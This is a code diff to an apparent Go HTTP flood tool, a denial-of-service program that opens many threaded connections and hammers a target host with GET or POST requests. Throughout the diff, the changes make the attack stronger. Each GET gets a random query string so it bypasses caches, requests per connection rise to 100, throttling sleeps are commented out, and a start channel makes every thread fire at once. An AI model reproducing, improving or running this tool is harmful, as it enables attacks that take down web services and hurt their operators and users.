@@ -109,6 +109,7 @@ var (
 			rand.NewSource(time.Now().UnixNano()),
 		),
 	)
+	start = make(chan bool)
 )
 
 type Randomizer interface {
@@ -142,17 +143,15 @@ func flood() {
 	addr := os.Args[1]
 	addr += ":"
 	addr += os.Args[2]
-	request := ""
+	header := ""
 	if os.Args[5] == "get" {
-		var rand_url = strconv.Itoa(rand.Intn(1000000))
-		request += "GET " + os.Args[4] + "?" + rand_url
-		request += " HTTP/1.1\r\nHost: "
-		request += addr + "\r\n"
+		header += " HTTP/1.1\r\nHost: "
+		header += addr + "\r\n"
 		if os.Args[7] == "nil" {
 			var useragent = GetRandom() //random useragent
-			request += "Connection: Keep-Alive\r\n"
-			request += "User-Agent: " + useragent + "\r\n"
-			request += "Accept: */*\r\n"
+			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
+			header += "User-Agent: " + useragent + "\r\n"
+			header += "Accept: text/plain\r\n"
 		} else {
 			fi, err := os.Open(os.Args[7])
 			if err != nil {
@@ -166,11 +165,10 @@ func flood() {
 				if c == io.EOF {
 					break
 				}
-				request += string(a) + "\r\n"
+				header += string(a) + "\r\n"
 			}
 		}
-		request += "\r\n"
-	} else {
+	} else if os.Args[5] == "post" {
 		data := ""
 		if os.Args[7] != "nil" {
 			fi, err := os.Open(os.Args[7])
@@ -193,13 +191,21 @@ func flood() {
 				data += string(abcd[rand.Intn(len(abcd))])
 			}
 		}
-		request := "POST " + os.Args[4] + " HTTP/1.1\r\nHost: " + addr + "\r\n"
-		request += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
-		request += "Accept-Encoding: gzip, deflate\r\n\r\n" + data
+		header := "POST " + os.Args[4] + " HTTP/1.1\r\nHost: " + addr + "\r\n"
+		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
+		header += "Accept-Encoding: gzip, deflate\r\n\n" + data
 	}
 	var s net.Conn
 	var err error
-	for {
+	rand.Seed(time.Now().UnixNano())
+	<-start
+	for { /*
+			request := ""
+			if os.Args[5] == "get" {
+				var rand_url = strconv.Itoa(rand.Intn(1000000000))
+				request += "GET " + os.Args[4] + "?" + rand_url
+			}
+			request += header + "\r\n\r\n"*/
 		if os.Args[2] == "443" {
 			s, err = tls.Dial("tcp", addr, nil)
 		} else {
@@ -209,11 +215,18 @@ func flood() {
 			fmt.Println("Connection Down!!!")
 		} else {
 			defer s.Close()
-			for i := 1; i <= 70; i++ {
+			for i := 0; i <= 100; i++ {
+				request := ""
+				if os.Args[5] == "get" {
+					var rand_url = strconv.Itoa(rand.Intn(1000000000000000000))
+					request += "GET " + os.Args[4] + "?" + rand_url
+				}
+				request += header + "\r\n\r\n"
 				s.Write([]byte(request))
-				time.Sleep(time.Millisecond * 100)
+				//time.Sleep(time.Millisecond * 200)
 			}
 		}
+		//time.Sleep(time.Second * 1)
 		//fmt.Println("Threads@", threads, " Hitting Target -->", url)
 	}
 }
@@ -225,7 +238,7 @@ func main() {
 	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
 	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
 	fmt.Println("                          ||                                             ")
-	fmt.Println("                         .||                     Golang version 1.2      ")
+	fmt.Println("                         .||                     Golang version 1.5      ")
 	fmt.Println("                                                        C0d3d By L330n123")
 	fmt.Println("==========================================================================")
 	if len(os.Args) != 8 {
@@ -235,11 +248,22 @@ func main() {
 	}
 	var threads, _ = strconv.Atoi(os.Args[3])
 	var limit, _ = strconv.Atoi(os.Args[6])
-	fmt.Println("Flood will end in " + os.Args[6] + " seconds.")
-	for i := 0; i < threads; i++ {
+	input := bufio.NewReader(os.Stdin)
+	for i := 1; i <= threads; i++ {
+		time.Sleep(time.Millisecond * 10)
 		go flood() // Start threads
+		fmt.Printf("\rThreads [%.0f] are ready", float64(i))
+		os.Stdout.Sync()
 		//time.Sleep( time.Millisecond * 1)
 	}
+	fmt.Printf("\nPlease [Enter] for continue")
+	_, err := input.ReadString('\n')
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(1)
+	}
+	fmt.Println("Flood will end in " + os.Args[6] + " seconds.")
+	close(start)
 	time.Sleep(time.Duration(limit) * time.Second)
 	//Keep the threads continue
 }
